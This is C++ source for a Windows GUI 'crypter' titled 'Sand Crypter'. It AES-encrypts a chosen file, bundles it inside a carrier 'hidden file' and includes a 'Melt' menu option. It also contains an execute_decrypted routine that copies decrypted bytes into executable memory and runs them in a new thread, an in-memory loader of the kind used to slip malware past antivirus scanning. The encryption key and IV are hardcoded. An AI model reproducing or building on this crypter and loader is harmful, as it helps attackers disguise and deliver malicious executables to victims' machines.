#include "pch.h"
#include "resource.h"
#include "encryption.h"
#include "bundler.h"
#include "loader.h"
#include <vector>
#include <string>
#include <iostream>
#include <fstream>
#include <memory>
#include <thread>
#include <sstream>
#include <windowsx.h>
#include <commctrl.h>
#include <shellapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <atlbase.h>
#include <atlconv.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <thread>
#include <future>
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "Shell32.lib")

#define ID_FILE_ENCRYPT 1
#define ID_FILE_ICON 2
#define ID_FILE_EXIT 3
#define ID_HELP_ABOUT 4
#define ID_MAIN_FILE_PANE 5
#define ID_HIDDEN_FILE_PANE 6
#define ID_OUTPUT_PANE 7
#define IDC_MAIN_STATUS 8
#define ID_SELECT_MAIN_FILE 9
#define ID_SELECT_HIDDEN_FILE 10
#define ID_OUTPUT_DIR 11

HBRUSH hbrBkgnd = NULL;
std::string mainFilePath;
std::string hiddenFilePath;
std::string outputDirectory;
std::string iconFilePath;
HWND hEncryptButton;
HWND hIconButton;
HWND hStatus;
HWND hMainFilePane;
HWND hHiddenFilePane;
HWND hOutputPane;
HWND hSelectMainFileButton;
HWND hSelectHiddenFileButton;
HWND hOutputDirButton;

std::string OpenFileDialog(HWND hwnd, const wchar_t* filter) {
    (void)hwnd;  // Prevent unused parameter warning

    OPENFILENAME ofn;
    wchar_t fileName[MAX_PATH] = L"";

    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = hwnd;
    ofn.lpstrFilter = filter;
    ofn.lpstrFile = fileName;
    ofn.nMaxFile = MAX_PATH;
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;

    if (GetOpenFileName(&ofn)) {
        char fileNameCStr[MAX_PATH];
        size_t convertedChars = 0;
        wcstombs_s(&convertedChars, fileNameCStr, fileName, MAX_PATH - 1);
        fileNameCStr[convertedChars] = '\0'; // Ensure zero-termination
        return std::string(fileNameCStr);
    }

    return "";
}

std::string OpenDirectoryDialog(HWND hwnd) {
    UNREFERENCED_PARAMETER(hwnd); // Suppress the unused parameter warning

    BROWSEINFO bi = { 0 };
    bi.lpszTitle = L"Pick a Directory";
    LPITEMIDLIST pidl = SHBrowseForFolder(&bi);

    if (pidl != 0) {
        wchar_t path[MAX_PATH];
        SHGetPathFromIDList(pidl, path);

        char pathCStr[MAX_PATH];
        size_t convertedChars = 0;
        wcstombs_s(&convertedChars, pathCStr, path, MAX_PATH - 1);
        pathCStr[convertedChars] = '\0'; // Ensure zero-termination

        // Free memory used
        IMalloc* imalloc = 0;
        if (SUCCEEDED(SHGetMalloc(&imalloc))) {
            imalloc->Free(pidl);
            imalloc->Release();
        }

        return std::string(pathCStr);
    }
    return "";
}

std::wstring stringToWString(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

std::string GetFileName(const std::string& filePath) {
    char fileName[MAX_PATH];
    _splitpath_s(filePath.c_str(), NULL, 0, NULL, 0, fileName, MAX_PATH, NULL, 0);
    return std::string(fileName);
}

HICON GetFileIcon(const std::string& filePath) {
    SHFILEINFOA shfi = { 0 };
    if (SHGetFileInfoA(filePath.c_str(), 0, &shfi, sizeof(shfi), SHGFI_ICON | SHGFI_SMALLICON)) {
        return shfi.hIcon;
    }
    return NULL;
}

void SetTransparency(HWND hwnd, BYTE alpha) {
    LONG style = GetWindowLong(hwnd, GWL_EXSTYLE);
    SetWindowLong(hwnd, GWL_EXSTYLE, style | WS_EX_LAYERED);
    SetLayeredWindowAttributes(hwnd, 0, alpha, LWA_ALPHA);
}

void HandleFileSelection(HWND hwnd, HWND targetPane, std::string& filePath) {
    std::string selectedFile = OpenFileDialog(hwnd, L"All Files\0*.*\0");
    if (!selectedFile.empty()) {
        filePath = selectedFile;
        std::string fileName = GetFileName(filePath);
        HICON hIcon = GetFileIcon(filePath);
        SetWindowText(targetPane, stringToWString(fileName).c_str());
        SendMessage(targetPane, STM_SETICON, (WPARAM)hIcon, 0);
    }
}

void execute_decrypted(const std::vector<unsigned char>& decrypted_data) {
    // Allocate memory for the executable
    void* exec_mem = VirtualAlloc(NULL, decrypted_data.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) return;

    // Copy the decrypted executable to the allocated memory
    std::memcpy(exec_mem, decrypted_data.data(), decrypted_data.size());

    // Create a new thread to execute the decrypted executable from memory
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    // Free the allocated memory
    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

void OnEncryptButtonClick(HWND hwnd) {
    const unsigned char key[32] = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a,
        0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15,
        0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f
    };
    const unsigned char iv[16] = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a,
        0x0b, 0x0c, 0x0d, 0x0e, 0x0f
    };

    if (mainFilePath.empty()) {
        MessageBox(hwnd, L"No main file selected.", L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    if (hiddenFilePath.empty()) {
        MessageBox(hwnd, L"No hidden file selected.", L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    if (outputDirectory.empty()) {
        MessageBox(hwnd, L"No output directory selected.", L"Error", MB_OK | MB_ICONERROR);
        return;
    }

    std::vector<unsigned char> encrypted_data;
    std::thread encrypt_thread(parallel_encrypt, mainFilePath, std::ref(encrypted_data), key, iv);
    encrypt_thread.join();

    std::string bundled_file = outputDirectory + "\\" + GetFileName(mainFilePath);

    if (bundle_with_carrier(hiddenFilePath, encrypted_data, bundled_file)) {
        std::wstring successMessage = L"Encryption and bundling successful. Output file created: " + stringToWString(bundled_file);
        MessageBox(hwnd, successMessage.c_str(), L"Success", MB_OK | MB_ICONINFORMATION);
    }
    else {
        MessageBox(hwnd, L"Bundling failed.", L"Error", MB_OK | MB_ICONERROR);
    }
}

void OnIconButtonClick(HWND hwnd) {
    iconFilePath = OpenFileDialog(hwnd, L"Icon Files\0*.ico\0All Files\0*.*\0");
    if (!iconFilePath.empty()) {
        std::wstring successMessage = L"Icon file selected: " + stringToWString(iconFilePath);
        MessageBox(hwnd, successMessage.c_str(), L"Icon Selected", MB_OK | MB_ICONINFORMATION);
    }
}

void OnOutputDirButtonClick(HWND hwnd) {
    outputDirectory = OpenDirectoryDialog(hwnd);
    if (!outputDirectory.empty()) {
        std::wstring outputPathMessage = L"Output directory selected: " + stringToWString(outputDirectory);
        MessageBox(hwnd, outputPathMessage.c_str(), L"Output Directory Selected", MB_OK | MB_ICONINFORMATION);
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE: {
        hStatus = CreateWindowEx(0, STATUSCLASSNAME, NULL,
            WS_CHILD | WS_VISIBLE,
            0, 0, 0, 0,
            hwnd, (HMENU)IDC_MAIN_STATUS,
            GetModuleHandle(NULL), NULL);
        int statwidths[] = { 100, -1 };
        SendMessage(hStatus, SB_SETPARTS, sizeof(statwidths) / sizeof(int), (LPARAM)statwidths);
        SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)L"Ready");

        // Create panes for drag-and-drop and click-to-select functionality
        hMainFilePane = CreateWindowEx(0, L"STATIC", L"Drop Main File Here or Click to Select",
            WS_CHILD | WS_VISIBLE | SS_CENTER | SS_ICON,
            50, 50, 300, 150, hwnd, (HMENU)ID_MAIN_FILE_PANE, GetModuleHandle(NULL), NULL);
        hSelectMainFileButton = CreateWindowEx(0, L"BUTTON", L"Select Main File",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            50, 210, 300, 30, hwnd, (HMENU)ID_SELECT_MAIN_FILE, GetModuleHandle(NULL), NULL);

        hHiddenFilePane = CreateWindowEx(0, L"STATIC", L"Drop Hidden File Here or Click to Select",
            WS_CHILD | WS_VISIBLE | SS_CENTER | SS_ICON,
            400, 50, 300, 150, hwnd, (HMENU)ID_HIDDEN_FILE_PANE, GetModuleHandle(NULL), NULL);
        hSelectHiddenFileButton = CreateWindowEx(0, L"BUTTON", L"Select Hidden File",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            400, 210, 300, 30, hwnd, (HMENU)ID_SELECT_HIDDEN_FILE, GetModuleHandle(NULL), NULL);

        // Create encryption button
        hEncryptButton = CreateWindowEx(0, L"BUTTON", L"Encrypt and Bundle",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            50, 260, 300, 50, hwnd, (HMENU)ID_FILE_ENCRYPT, GetModuleHandle(NULL), NULL);

        // Create icon selection button
        hIconButton = CreateWindowEx(0, L"BUTTON", L"Select Icon",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            400, 260, 300, 50, hwnd, (HMENU)ID_FILE_ICON, GetModuleHandle(NULL), NULL);

        // Create output directory button
        hOutputDirButton = CreateWindowEx(0, L"BUTTON", L"Select Output Directory",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            50, 320, 650, 50, hwnd, (HMENU)ID_OUTPUT_DIR, GetModuleHandle(NULL), NULL);

        // Set dark background and white text for panes
        SendMessage(hMainFilePane, WM_CTLCOLORSTATIC, (WPARAM)GetDC(hMainFilePane), (LPARAM)GetDC(hwnd));
        SendMessage(hHiddenFilePane, WM_CTLCOLORSTATIC, (WPARAM)GetDC(hHiddenFilePane), (LPARAM)GetDC(hwnd));

        SetTransparency(hwnd, 230); // Set transparency to 90%

        break;
    }
    case WM_COMMAND: {
        switch (LOWORD(wParam)) {
        case ID_FILE_ENCRYPT: {
            OnEncryptButtonClick(hwnd);
            break;
        }
        case ID_FILE_ICON: {
            OnIconButtonClick(hwnd);
            break;
        }
        case ID_OUTPUT_DIR: {
            OnOutputDirButtonClick(hwnd);
            break;
        }
        case ID_FILE_EXIT:
            PostMessage(hwnd, WM_CLOSE, 0, 0);
            break;
        case ID_HELP_ABOUT:
            MessageBox(hwnd, L"File Crypter\nVersion 1.0\nDeveloped by [Havok]", L"About File Crypter", MB_OK | MB_ICONINFORMATION);
            break;
        case ID_SELECT_MAIN_FILE:
            HandleFileSelection(hwnd, hMainFilePane, mainFilePath);
            break;
        case ID_SELECT_HIDDEN_FILE:
            HandleFileSelection(hwnd, hHiddenFilePane, hiddenFilePath);
            break;
        }
        break;
    }
    case WM_DROPFILES: {
        HDROP hDrop = (HDROP)wParam;
        wchar_t filePath[MAX_PATH];
        DragQueryFile(hDrop, 0, filePath, MAX_PATH);

        char filePathCStr[MAX_PATH];
        size_t convertedChars = 0;
        wcstombs_s(&convertedChars, filePathCStr, filePath, MAX_PATH - 1);
        filePathCStr[convertedChars] = '\0'; // Ensure zero-termination
        std::string filePathStr(filePathCStr);

        RECT mainPaneRect, hiddenPaneRect, outputPaneRect;
        GetWindowRect(hMainFilePane, &mainPaneRect);
        GetWindowRect(hHiddenFilePane, &hiddenPaneRect);
        GetWindowRect(hOutputPane, &outputPaneRect);

        POINT pt;
        DragQueryPoint(hDrop, &pt);

        ScreenToClient(hwnd, &pt);

        HICON hIcon = GetFileIcon(filePathStr);
        std::string fileName = GetFileName(filePathStr);

        if (PtInRect(&mainPaneRect, pt)) {
            mainFilePath = filePathStr;
            SetWindowText(hMainFilePane, stringToWString(fileName).c_str());
            SendMessage(hMainFilePane, STM_SETICON, (WPARAM)hIcon, 0);
        }
        else if (PtInRect(&hiddenPaneRect, pt)) {
            hiddenFilePath = filePathStr;
            SetWindowText(hHiddenFilePane, stringToWString(fileName).c_str());
            SendMessage(hHiddenFilePane, STM_SETICON, (WPARAM)hIcon, 0);
        }

        DragFinish(hDrop);
        break;
    }
    case WM_CTLCOLORDLG:
    case WM_CTLCOLORSTATIC: {
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, RGB(255, 255, 255));
        SetBkMode(hdcStatic, TRANSPARENT);
        return (INT_PTR)hbrBkgnd;
    }
    case WM_SIZE: {
        SendMessage(hStatus, WM_SIZE, 0, 0);
        break;
    }
    case WM_DESTROY:
        if (hbrBkgnd) {
            DeleteObject(hbrBkgnd);
        }
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ PWSTR pCmdLine, _In_ int nCmdShow) {
    (void)pCmdLine;
    (void)hPrevInstance;

    const wchar_t CLASS_NAME[] = L"Sample Window Class";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.hbrBackground = CreateSolidBrush(RGB(45, 45, 48));  // Dark gray background
    wc.lpszClassName = CLASS_NAME;

    if (!RegisterClass(&wc)) {
        MessageBox(NULL, L"Window Registration Failed!", L"Error", MB_OK | MB_ICONERROR);
        return 0;
    }

    HWND hwnd = CreateWindowEx(
        0,
        CLASS_NAME,
        L"Sand Crypter",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 800, 600,
        NULL,
        NULL,
        hInstance,
        NULL
    );

    if (hwnd == NULL) {
        MessageBox(NULL, L"Window Creation Failed!", L"Error", MB_OK | MB_ICONERROR);
        return 0;
    }

    // Enable drag-and-drop
    DragAcceptFiles(hwnd, TRUE);

    HMENU hMenu = CreateMenu();
    HMENU hFileMenu = CreateMenu();
    HMENU hHelpMenu = CreateMenu();

    AppendMenu(hFileMenu, MF_STRING, ID_FILE_ENCRYPT, L"Melt");
    AppendMenu(hFileMenu, MF_STRING, ID_FILE_ICON, L"Select Icon");
    AppendMenu(hFileMenu, MF_STRING, ID_FILE_EXIT, L"Exit");

    AppendMenu(hHelpMenu, MF_STRING, ID_HELP_ABOUT, L"About");

    AppendMenu(hMenu, MF_POPUP, (UINT_PTR)hFileMenu, L"File");
    AppendMenu(hMenu, MF_POPUP, (UINT_PTR)hHelpMenu, L"Help");

    SetMenu(hwnd, hMenu);

    // Add status bar
    hStatus = CreateWindowEx(0, STATUSCLASSNAME, NULL,
        WS_CHILD | WS_VISIBLE,
        0, 0, 0, 0,
        hwnd, (HMENU)IDC_MAIN_STATUS,
        GetModuleHandle(NULL), NULL);
    int statwidths[] = { 100, -1 };
    SendMessage(hStatus, SB_SETPARTS, sizeof(statwidths) / sizeof(int), (LPARAM)statwidths);
    SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)L"Ready");

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
